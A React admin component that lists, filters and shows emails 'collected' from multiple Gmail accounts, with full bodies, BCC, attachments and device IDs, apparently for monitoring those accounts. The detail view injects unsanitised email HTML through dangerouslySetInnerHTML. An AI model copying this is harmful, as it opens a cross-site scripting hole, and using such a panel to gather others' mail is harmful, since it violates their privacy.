import React, { useState, useEffect, useCallback } from 'react';
import { toast } from 'react-toastify';
import './AdminViews.css';

const EmailsView = () => {
  const [emails, setEmails] = useState([]);
  const [gmailAccounts, setGmailAccounts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterAccount, setFilterAccount] = useState('all');
  const [filterRead, setFilterRead] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [selectedEmail, setSelectedEmail] = useState(null);

  const fetchGmailAccounts = useCallback(async () => {
    try {
      const response = await fetch('/api/gmail/accounts');
      if (response.ok) {
        const data = await response.json();
        setGmailAccounts(data.accounts || []);
      }
    } catch (error) {
      console.error('Error fetching Gmail accounts:', error);
    }
  }, []);

  const fetchEmails = useCallback(async () => {
    try {
      setLoading(true);
      const response = await fetch(`/api/gmail/emails?page=${currentPage}&account=${filterAccount}&read=${filterRead}`);
      if (response.ok) {
        const data = await response.json();
        setEmails(data.emails || []);
        setTotalPages(data.totalPages || 1);
      } else {
        toast.error('Failed to fetch emails');
      }
    } catch (error) {
      console.error('Error fetching emails:', error);
      toast.error('Error loading emails');
    } finally {
      setLoading(false);
    }
  }, [currentPage, filterAccount, filterRead]);

  useEffect(() => {
    fetchGmailAccounts();
    fetchEmails();
  }, [fetchGmailAccounts, fetchEmails]);

  const filteredEmails = emails.filter(email =>
    email.subject.toLowerCase().includes(searchTerm.toLowerCase()) ||
    email.from.toLowerCase().includes(searchTerm.toLowerCase()) ||
    email.to.toLowerCase().includes(searchTerm.toLowerCase()) ||
    email.body.toLowerCase().includes(searchTerm.toLowerCase()) ||
    email.snippet.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const getReadBadge = (isRead) => {
    return (
      <span className={`read-badge ${isRead ? 'read' : 'unread'}`}>
        {isRead ? 'Read' : 'Unread'}
      </span>
    );
  };

  const getStarBadge = (isStarred) => {
    return (
      <span className={`star-badge ${isStarred ? 'starred' : 'unstarred'}`}>
        {isStarred ? '⭐' : '☆'}
      </span>
    );
  };

  const getImportantBadge = (isImportant) => {
    return (
      <span className={`important-badge ${isImportant ? 'important' : 'normal'}`}>
        {isImportant ? '🔥 Important' : 'Normal'}
      </span>
    );
  };

  const viewEmailDetails = (email) => {
    setSelectedEmail(email);
  };

  const closeModal = () => {
    setSelectedEmail(null);
  };

  const truncateText = (text, maxLength = 100) => {
    if (!text) return 'N/A';
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
  };

  const getAccountEmail = (gmailAccountId) => {
    const account = gmailAccounts.find(acc => acc._id === gmailAccountId);
    return account ? account.email : 'Unknown Account';
  };

  if (loading) {
    return <div className="loading">Loading emails...</div>;
  }

  return (
    <div className="admin-view">
      <div className="view-header">
        <h1>📧 Emails Management</h1>
        <p>Monitor all collected emails from Gmail accounts</p>
      </div>

      <div className="controls">
        <div className="search-filter">
          <input
            type="text"
            placeholder="Search emails..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <select
            value={filterAccount}
            onChange={(e) => setFilterAccount(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Accounts</option>
            {gmailAccounts.map(account => (
              <option key={account._id} value={account._id}>
                {account.email}
              </option>
            ))}
          </select>
          <select
            value={filterRead}
            onChange={(e) => setFilterRead(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Status</option>
            <option value="read">Read Only</option>
            <option value="unread">Unread Only</option>
          </select>
        </div>
        <button onClick={fetchEmails} className="refresh-btn">
          🔄 Refresh
        </button>
      </div>

      <div className="stats-summary">
        <div className="stat-item">
          <span className="stat-label">Total Emails:</span>
          <span className="stat-value">{emails.length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Unread:</span>
          <span className="stat-value">{emails.filter(e => !e.isRead).length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Starred:</span>
          <span className="stat-value">{emails.filter(e => e.isStarred).length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Important:</span>
          <span className="stat-value">{emails.filter(e => e.isImportant).length}</span>
        </div>
      </div>

      <div className="data-table">
        <table>
          <thead>
            <tr>
              <th>Account</th>
              <th>From</th>
              <th>Subject</th>
              <th>Snippet</th>
              <th>Status</th>
              <th>Date</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filteredEmails.map((email) => (
              <tr key={email._id}>
                <td>
                  <div className="account-info">
                    {getAccountEmail(email.gmailAccountId)}
                  </div>
                </td>
                <td>
                  <div className="email-from">
                    {truncateText(email.from, 30)}
                  </div>
                </td>
                <td>
                  <div className="email-subject">
                    {truncateText(email.subject, 50)}
                  </div>
                </td>
                <td>
                  <div className="email-snippet">
                    {truncateText(email.snippet, 80)}
                  </div>
                </td>
                <td>
                  <div className="email-status">
                    {getReadBadge(email.isRead)}
                    {getStarBadge(email.isStarred)}
                    {getImportantBadge(email.isImportant)}
                  </div>
                </td>
                <td>{formatDate(email.timestamp)}</td>
                <td>
                  <button
                    onClick={() => viewEmailDetails(email)}
                    className="view-btn"
                  >
                    👁️ View
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {totalPages > 1 && (
        <div className="pagination">
          <button
            onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
            disabled={currentPage === 1}
            className="page-btn"
          >
            Previous
          </button>
          <span className="page-info">
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
            disabled={currentPage === totalPages}
            className="page-btn"
          >
            Next
          </button>
        </div>
      )}

      {/* Email Details Modal */}
      {selectedEmail && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content large" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h2>Email Details</h2>
              <button onClick={closeModal} className="close-btn">×</button>
            </div>
            <div className="modal-body">
              <div className="detail-section">
                <h3>Email Information</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Account:</label>
                    <span>{getAccountEmail(selectedEmail.gmailAccountId)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Message ID:</label>
                    <span>{selectedEmail.messageId}</span>
                  </div>
                  <div className="detail-item">
                    <label>Thread ID:</label>
                    <span>{selectedEmail.threadId}</span>
                  </div>
                  <div className="detail-item">
                    <label>Status:</label>
                    <span>
                      {getReadBadge(selectedEmail.isRead)}
                      {getStarBadge(selectedEmail.isStarred)}
                      {getImportantBadge(selectedEmail.isImportant)}
                    </span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Headers</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>From:</label>
                    <span>{selectedEmail.from}</span>
                  </div>
                  <div className="detail-item">
                    <label>To:</label>
                    <span>{selectedEmail.to}</span>
                  </div>
                  <div className="detail-item">
                    <label>CC:</label>
                    <span>{selectedEmail.cc || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>BCC:</label>
                    <span>{selectedEmail.bcc || 'N/A'}</span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Content</h3>
                <div className="detail-item full-width">
                  <label>Subject:</label>
                  <div className="content-text">{selectedEmail.subject}</div>
                </div>
                <div className="detail-item full-width">
                  <label>Snippet:</label>
                  <div className="content-text">{selectedEmail.snippet}</div>
                </div>
                <div className="detail-item full-width">
                  <label>Body:</label>
                  <div className="email-body">
                    {selectedEmail.bodyHtml ? (
                      <div dangerouslySetInnerHTML={{ __html: selectedEmail.bodyHtml }} />
                    ) : (
                      <div className="content-text">{selectedEmail.body}</div>
                    )}
                  </div>
                </div>
              </div>

              {selectedEmail.labels && selectedEmail.labels.length > 0 && (
                <div className="detail-section">
                  <h3>Labels</h3>
                  <div className="labels-container">
                    {selectedEmail.labels.map((label, index) => (
                      <span key={index} className="label-badge">{label}</span>
                    ))}
                  </div>
                </div>
              )}

              {selectedEmail.attachments && selectedEmail.attachments.length > 0 && (
                <div className="detail-section">
                  <h3>Attachments ({selectedEmail.attachments.length})</h3>
                  <div className="attachments-list">
                    {selectedEmail.attachments.map((attachment, index) => (
                      <div key={index} className="attachment-item">
                        <div className="attachment-name">{attachment.filename}</div>
                        <div className="attachment-info">
                          {attachment.mimeType} • {(attachment.size / 1024).toFixed(1)} KB
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <div className="detail-section">
                <h3>Metadata</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Internal Date:</label>
                    <span>{selectedEmail.internalDate}</span>
                  </div>
                  <div className="detail-item">
                    <label>Size Estimate:</label>
                    <span>{(selectedEmail.sizeEstimate / 1024).toFixed(1)} KB</span>
                  </div>
                  <div className="detail-item">
                    <label>Processed:</label>
                    <span>{selectedEmail.processed ? 'Yes' : 'No'}</span>
                  </div>
                  <div className="detail-item">
                    <label>Device ID:</label>
                    <span>{selectedEmail.deviceId || 'N/A'}</span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Timestamps</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Timestamp:</label>
                    <span>{formatDate(selectedEmail.timestamp)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Created:</label>
                    <span>{formatDate(selectedEmail.createdAt)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Updated:</label>
                    <span>{formatDate(selectedEmail.updatedAt)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default EmailsView; 